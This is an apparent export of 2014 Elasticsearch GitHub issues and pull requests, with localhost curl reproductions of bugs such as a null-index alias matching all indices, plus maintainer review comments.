                "disable_coord": true,
                "should": [
                  {
                    "simple_query_string" : {
                      "query" : "\"document body\"~2",
                      "default_operator" : "and",
                      "flags": "PHRASE|SLOP",
                      "fields": ["body^5"]
                    }
                  },
                  {
                    "simple_query_string" : {
                      "query" : "document body",
                      "default_operator" : "and",
                      "fields": ["body"],
                      "flags": "NONE"
                    }
                  }
                ]
              }
            },
            "type": "entity",
            "score_mode": "sum"
          }
        }
      ]
    }
  }
}
'
```

The search fails with `NumberFormatException[For input string: \"PHRASE|SLOP\"];` exception.

The problem occurs because `simple_query_string` parser is using `XContentParser.hasTextCharacters()` method to check for the presence of text in the token, while this method should be only used to detect internal presentation of the string. 

The issue was originally reported on the mailing list https://groups.google.com/forum/#!topic/elasticsearch-ru/SeiifNQW-qo
</description><key id="43938082">7875</key><summary>simple_query_string parser may fail with NumberFormatException while parsing flags</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">imotov</reporter><labels><label>bug</label></labels><created>2014-09-25T16:21:20Z</created><updated>2014-09-26T07:53:45Z</updated><resolved>2014-09-26T07:53:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>null_value and dynamic_templates not working correctly</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7874</link><project id="" key="" /><description>If you have a dynamic template that maps a field with a null_value, and you index 1 document with an explicit null value to the field, the null_value mapping does not apply correctly.

Steps to reproduce:

```
curl -XDELETE localhost:9200/test

curl -XPUT localhost:9200/test -d '{
  "mappings": {
    "event": {
      "dynamic_templates": [
      {
        "values_as_string": {
          "match": "property",
          "mapping": {
            "type": "string",
            "null_value": "_null_"
          }
        }
      }
      ]
    }
  }
}'

curl -XPUT localhost:9200/test/event/2 -d '
{
  "property": null
}
'

curl -XPOST localhost:9200/test/_refresh

# returns no results, expected to return above document
curl -XPOST localhost:9200/test/_search -d '
{
  "query": {
    "filtered": {
      "filter": {
        "term": {
          "property": "_null_"
        }
      }
    }
  }
}'
```
</description><key id="43916523">7874</key><summary>null_value and dynamic_templates not working correctly</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">bly2k</reporter><labels><label>docs</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T13:02:26Z</created><updated>2016-12-21T19:40:08Z</updated><resolved>2014-10-16T13:05:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-10-03T08:40:28Z" id="57769597">I have looked at fixing this but it's not straight forward.

My current attempt is at the following commit: https://github.com/colings86/elasticsearch/commit/fa593ae6c5c4bb56b2859b863cca64240dd6ae4a

The issue with the fix is described in the commit message:

&gt; Previous to this change if an index was using dynamic templates and the value of the first matching field to come in was null, we would ignore the field. This meant that if the matching field defined a null_value, we would not index the null_value for any documents that come in until we get the first document with a non-null value. To fix this I have added an attempt to parse the null value as a dynamic field when we don't have a concrete mapping defined yet.
&gt; 
&gt; The issue with this comes when the dynamic template defines `{dynamic_type}` placeholder(s), we won't know what type the field is supposed to be since it's value in the input doc is null, so we have nothing sensible to replace this placeholder with.
</comment><comment author="clintongormley" created="2014-10-14T17:03:53Z" id="59079915">@colings86 Yep, that is indeed a problem.  I don't think there _is_ a way of doing the right thing here.

Perhaps just document and close.
</comment><comment author="marshall007" created="2016-12-21T19:40:08Z" id="268619564">@clintongormley are there any workarounds for using `null_value` in a dynamic template? If there were just a way to configure `null` value handling for an entire index (in other words, at a more global level prior to it just being tossed out and/or dynamic mapping taking place) that would go a long way.</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Perform write consistency check just before writing on the primary shard</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7873</link><project id="" key="" /><description>Before this change the write consistency change was performed on the node that receives the write request and the node that holds the primary shard. This change removes the check on the node that receives the request, since it is redundant.

Also this change moves the write consistency check on the node that holds the primary shard to a later moment after forking of the thread to perform the actual write on the primary shard. 
</description><key id="43908572">7873</key><summary>Resiliency: Perform write consistency check just before writing on the primary shard</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>:Core</label><label>enhancement</label><label>resiliency</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T11:34:39Z</created><updated>2015-05-18T23:29:54Z</updated><resolved>2014-10-06T17:12:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-30T11:18:25Z" id="57298668">@bleskes I updated the PR.
</comment><comment author="s1monw" created="2014-10-02T20:25:33Z" id="57699403">this LGTM @bleskes your call
</comment><comment author="bleskes" created="2014-10-06T07:40:23Z" id="57983312">The new retry logic is much cleaner. I left some minor comments. O.w. LGTM.
</comment><comment author="martijnvg" created="2014-10-06T14:26:44Z" id="58024375">@bleskes Thanks for the review. I've updated the PR.
</comment><comment author="bleskes" created="2014-10-06T14:30:34Z" id="58024974">Thx @martijnvg . Left one little comment about the change. I'm good with this, +1
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update regexp-syntax.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7872</link><project id="" key="" /><description>The plus sign "+" can be used to repeat the preceding shortest pattern once or more time.

at-least once therefor, For string "aaabbb":

aa+bbb+  #  no match
</description><key id="43908222">7872</key><summary>Update regexp-syntax.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">Sohair63</reporter><labels><label>docs</label></labels><created>2014-09-25T11:30:33Z</created><updated>2014-10-14T11:38:17Z</updated><resolved>2014-10-14T11:23:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:00:38Z" id="56849684">Hi @Sohair63 

Good catch. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="Sohair63" created="2014-09-25T18:08:57Z" id="56859490">sure.

On Thu, Sep 25, 2014 at 10:01 PM, Clinton Gormley notifications@github.com
wrote:

&gt; Hi @Sohair63 https://github.com/Sohair63
&gt; 
&gt; Good catch. Please could I ask you to sign the CLA so that I can merge
&gt; your changes in?
&gt; http://www.elasticsearch.org/contributor-agreement/
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/pull/7872#issuecomment-56849684
&gt; .

## 

Regards,

Sohair Ahmad.
</comment><comment author="clintongormley" created="2014-09-28T09:08:49Z" id="57079627">hi @Sohair63 - have you had a chance to sign the CLA yet?

thanks
</comment><comment author="Sohair63" created="2014-09-29T04:08:14Z" id="57115107">i am not sure about this.

On Sun, Sep 28, 2014 at 2:09 PM, Clinton Gormley notifications@github.com
wrote:

&gt; hi @Sohair63 https://github.com/Sohair63 - have you had a chance to
&gt; sign the CLA yet?
&gt; 
&gt; thanks
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/pull/7872#issuecomment-57079627
&gt; .

## 

Regards,

Sohair Ahmad.
</comment><comment author="clintongormley" created="2014-10-14T11:20:26Z" id="59027360">CLA not signed. Treating as bug report.
</comment><comment author="clintongormley" created="2014-10-14T11:23:43Z" id="59027669">Actually, rereading this, the original version was correct.  It matches b, followed by b, followed by 1 or more b's.

Closing
</comment><comment author="Sohair63" created="2014-10-14T11:32:57Z" id="59028565">What about the + after third 'b' ? 
Isn't this true that + means there should be one character. 
</comment><comment author="clintongormley" created="2014-10-14T11:34:22Z" id="59028702">the third element is `b+`, which says "one or more b's". It doesn't mean "b plus more b's", so it is correct
</comment><comment author="Sohair63" created="2014-10-14T11:38:17Z" id="59029082">Oh I got it. But i will implement and will confirm about this feature, because only b\* in regular expressions means 0 or more b's, Not confirm about this.

Thanks for clarification.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>hasChild Query: add support for score_mode='min'</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7871</link><project id="" key="" /><description>The has_child query currently supports the following score types: "max, sum, avg, none". 
In our application, we use the score mode along with a function_score to sort asc/dsc based on matching children documents. We currently have a hack in place to sort asc/dsc but adding support for the 'min' mode would be great. 
</description><key id="43902615">7871</key><summary>hasChild Query: add support for score_mode='min'</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">stephane-bastian</reporter><labels /><created>2014-09-25T10:30:21Z</created><updated>2014-09-25T13:24:01Z</updated><resolved>2014-09-25T10:47:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-25T10:47:33Z" id="56802226">Hey @stephane-bastian issue #7603 is already open for adding score mode `min` to the `has_child` query.
</comment><comment author="stephane-bastian" created="2014-09-25T13:24:01Z" id="56817538">ooops... I checked before posting but didn't see this issue. Sorry about that 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Split internal fetch request used within scroll and search</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7870</link><project id="" key="" /><description>Similar to #7856 but relates to the fetch shard level requests. We currently use the same internal request when we need to fetch within search and scroll. The two original requests though diverged after #6933 as `SearchRequest` implements `IndicesRequest` while `SearchScrollRequest` doesn't. That said, with #7319 we made `FetchSearchRequest` implement `IndicesRequest` by making it hold the original indices taken from the original request, which are null if the fetch was originated by a search scroll, and that is why original indices are optional there.

This commit introduces a separate fetch request and transport action for scroll, which doesn't hold original indices. The new action is only used against nodes that expose it, the previous action name will be used for nodes older than 1.4.0.Beta1.

As a result, in 1.4 we have a new `indices:data/read/search[phase/fetch/id/scroll]` action that is equivalent to the previous `indices:data/read/search[phase/fetch/id]` whose request implements now IndicesRequest and holds the original indices coming from the original request. The original indices in the latter request can only be null during a rolling upgrade (already existing version checks make sure that serialization is bw compatible), when some nodes are still &lt; 1.4.
</description><key id="43890513">7870</key><summary>Split internal fetch request used within scroll and search</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T08:57:43Z</created><updated>2015-06-07T10:28:11Z</updated><resolved>2014-09-26T16:55:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-26T07:00:56Z" id="56926325">Addressed feedback, ready for another review round
</comment><comment author="uboness" created="2014-09-26T13:50:40Z" id="56963626">Added a couple of comments for documentation, other than that LGTM
</comment><comment author="javanna" created="2014-09-26T16:09:12Z" id="56982755">Added docs @uboness , you mind having another look please?
</comment><comment author="uboness" created="2014-09-26T16:22:02Z" id="56984386">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations, disable doc_count</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7869</link><project id="" key="" /><description>It may be interesting to be able to disable `doc_count` in aggregations.

My case: I have 3 nested terms aggregations, A =&gt; B =&gt; C.
I don't need `doc_count` in A and B.
Only values in C are relevant for me.

Is it doable?

I think it could lead to memory improvement.
</description><key id="43888788">7869</key><summary>Aggregations, disable doc_count</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">pierrre</reporter><labels><label>discuss</label></labels><created>2014-09-25T08:43:52Z</created><updated>2014-10-14T11:42:47Z</updated><resolved>2014-10-14T11:42:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:37:25Z" id="57198135">Hi @pierrre 

Actually it wouldn't make much difference to memory usage, but would add another branch in the code which might slow performance.
</comment><comment author="pierrre" created="2014-09-29T18:18:23Z" id="57204480">OK I understand.
You can close the issue if it's not a good idea.
</comment><comment author="clintongormley" created="2014-10-14T11:42:47Z" id="59029512">Closing, thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add ThreadPool.terminate to streamline shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7868</link><project id="" key="" /><description>Shutting down threadpools and executor services is done in very similar
fashion across the codebase. This commit streamlines the process by
adding a terminate method to ThreadPool.

This PR also re-enables the threadleak filtering including a 5 second linger period since threadpools don't join their threads.
</description><key id="43885974">7868</key><summary>Add ThreadPool.terminate to streamline shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Core</label><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T08:21:37Z</created><updated>2015-06-07T11:46:38Z</updated><resolved>2014-09-25T09:00:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-25T08:47:23Z" id="56790523">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update suggesters.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7867</link><project id="" key="" /><description>A request was malformed
</description><key id="43842326">7867</key><summary>Update suggesters.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">mdzor</reporter><labels><label>docs</label></labels><created>2014-09-25T02:23:10Z</created><updated>2014-09-28T09:04:55Z</updated><resolved>2014-09-28T09:04:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:01:06Z" id="56849733">Hi @mdzor 

Good catch. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="mdzor" created="2014-09-25T17:43:20Z" id="56855850">Hi,

Thanks! I just signed the CLA :+1: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Swap space grows uncontrolled on windows server</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7866</link><project id="" key="" /><description>I've tried everything from deleting the data and reindexing, disabling windows page file, setting memory lock to true, etc.  Basically every solution online for dealing with elastic's use of swap space has been tried.  Nothing has resolved this issue.  My guess is the issue is the swap statistic doesn't apply to windows, in which case the bug is simply querying for something other than OS Swap.  Otherwise, I'm not sure what the issue is
</description><key id="43833205">7866</key><summary>Swap space grows uncontrolled on windows server</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">FrederickManley</reporter><labels><label>feedback_needed</label></labels><created>2014-09-25T01:14:53Z</created><updated>2014-12-30T20:26:05Z</updated><resolved>2014-12-30T20:26:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:35:53Z" id="57197846">@FrederickManley are you saying that the swap usage as reported by the stats API grows, or that real swap usage as reported by windows grows?
</comment><comment author="clintongormley" created="2014-12-30T20:26:05Z" id="68394510">No further info provided. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Configure behavior when querying missing index</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7865</link><project id="" key="" /><description>Currently when querying a missing index, Elasticsearch returns an error:

```
$ curl localhost:9200/missing-index/_count
{"error":"IndexMissingException[[missing-index] missing]","status":404}
```

This isn't always the best choice when using autocreated indices. In that case, it's possible that an index hasn't been created yet because no writes have occurred. Queries should still succeed, but return zero results. This is the behavior when using wildcard index specifiers that match zero indices:

```
$ curl 'localhost:9200/missing-index*/_count'
{"count":0,"_shards":{"total":0,"successful":0,"failed":0}}
```

I'd like to be able to configure missing indices so they execute a zero-shard query instead of returning an error, same as non-matching wildcard specifiers.
</description><key id="43825819">7865</key><summary>Configure behavior when querying missing index</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">grantr</reporter><labels /><created>2014-09-24T23:11:33Z</created><updated>2014-09-29T17:55:12Z</updated><resolved>2014-09-29T17:34:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:34:40Z" id="57197664">Hi @grantr 

Why not use the `ignore_unavailable` parameter?  See http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/multi-index.html#multi-index
</comment><comment author="grantr" created="2014-09-29T17:54:59Z" id="57200936">@clintongormley that's exactly what I needed, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>No way to create an empty alias</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7864</link><project id="" key="" /><description>As a followup to #7863, it would be nice if alias actions with a null `index` created a new alias that matched zero indices. When queried, the alias would behave like a wildcard specifier that matches zero indices:

```
$ curl 'localhost:9200/missing-index*/_count'
{"count":0,"_shards":{"total":0,"successful":0,"failed":0}}
```

I'd be fine with this being off by default to preserve the historical behavior.
</description><key id="43825515">7864</key><summary>No way to create an empty alias</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">grantr</reporter><labels /><created>2014-09-24T23:07:14Z</created><updated>2016-09-12T17:54:45Z</updated><resolved>2014-09-29T17:32:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:32:53Z" id="57197369">Hi @grantr 

What would be the use case for this?  Regardless, this wouldn't be possible as aliases are stored in the index metadata.  
</comment><comment author="grantr" created="2014-09-29T17:55:12Z" id="57200973">Use case would be creating an alias to query in advance of creating indices. Like #7865, the `ignore_unavailable` parameter solves this.
</comment><comment author="nfrm" created="2016-09-12T17:54:45Z" id="246433476">This would be useful when using Templates that create indexes that are automatically added to an alias.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Null index in alias POST matches all indices</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7863</link><project id="" key="" /><description>Creating an alias with a null `index` matches all indices instead of none:

```
$ curl -XPUT localhost:9200/index1
{"acknowledged":true}
$ curl -XPUT localhost:9200/index2
{"acknowledged":true}
$ curl localhost:9200/_aliases -d '{"actions":[{"add":{"alias":"empty-alias", "index":null}}]}'
{"acknowledged":true}
$ curl localhost:9200/_aliases
{"index1":{"aliases":{"empty-alias":{}}},"index2":{"aliases":{"empty-alias":{}}}}
```

This behavior is surprising and dangerous. Someone who didn't know what to expect might accidentally delete all their indices:

```
$ curl -XDELETE localhost:9200/empty-alias
{"acknowledged":true}
$ curl localhost:9200/index1/_count
{"error":"IndexMissingException[[index1] missing]","status":404}
$ curl localhost:9200/index2/_count
{"error":"IndexMissingException[[index1] missing]","status":404}
```

When given a null `index` value, the alias action should raise an error. Creating an alias to match all indices should require a `*` wildcard as the `index` value.
</description><key id="43825079">7863</key><summary>Null index in alias POST matches all indices</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">grantr</reporter><labels><label>:Aliases</label><label>breaking</label><label>bug</label><label>low hanging fruit</label><label>v1.5.0</label></labels><created>2014-09-24T23:02:08Z</created><updated>2015-03-19T13:52:26Z</updated><resolved>2014-10-27T18:40:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="grantr" created="2014-09-29T18:00:30Z" id="57201819">I learned in #7864 that empty aliases are technically impossible, so I edited the issue to recommend raising an error.
</comment><comment author="polyfractal" created="2014-10-10T20:54:36Z" id="58714933">Fixed in https://github.com/elasticsearch/elasticsearch/commit/ee857bc07302b5bfcb327b3be9d07d9c6de28254, thanks for the bug report!

Edit: this change was backed out due to a testing problem.  See correction below
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Never send requests after transport service is stopped</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7862</link><project id="" key="" /><description>With local transport or any transport that doesn't necessarily send
notification if connections are closed we might miss a node
disconnection and the request handler hangs forever / until the timeout
kicks in. This window only exists during shutdown and is likely
unproblematic in practice but tests might run into this problem when
local transport is used.
</description><key id="43805983">7862</key><summary>Never send requests after transport service is stopped</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T19:39:35Z</created><updated>2015-06-07T12:00:37Z</updated><resolved>2014-09-25T09:55:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-25T07:39:26Z" id="56784443">I think this good to do, I left one comment w.r.t to potentially double error handling. 
</comment><comment author="s1monw" created="2014-09-25T08:46:46Z" id="56790462">@bleskes I think you missed the handling in the catch block...I pushed a new commit with some documetnation for that
</comment><comment author="bleskes" created="2014-09-25T08:48:20Z" id="56790619">@s1monw yes, missed it - was folded away. LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add index throttling to node stats</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7861</link><project id="" key="" /><description>Today, when single thread index throttling kicks in, it's only logged. We don't capture it in our stats. 
We should add the time a shard spent being index level throttled to our stats. 
</description><key id="43790605">7861</key><summary>Add index throttling to node stats</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>enhancement</label><label>low hanging fruit</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-24T17:12:42Z</created><updated>2014-10-29T08:53:52Z</updated><resolved>2014-10-22T13:09:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[TEST] add regular scroll REST test</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7860</link><project id="" key="" /><description /><key id="43786906">7860</key><summary>[TEST] add regular scroll REST test</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter 